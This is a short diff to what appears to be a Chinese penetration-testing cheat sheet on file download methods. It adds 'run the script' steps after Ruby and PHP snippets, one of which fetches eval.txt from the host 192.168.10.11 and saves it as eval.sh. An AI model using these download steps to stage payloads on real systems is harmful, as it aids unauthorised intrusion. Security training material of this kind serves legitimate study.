@@ -303,6 +303,12 @@ file.write(r.body)
 }
 ```
 
+##### 然后shell 终端运行：
+
+```
+ruby download.rb
+```
+
 
 
 #### ***PHP：***
@@ -326,6 +332,12 @@ file.write(r.body)
  $data = @file("http://192.168.10.11/eval.txt");
 file_put_contents('eval.sh',$data);
 ?>
+```
+
+##### 然后运行：
+
+```
+php download.php 
 ```
 
 
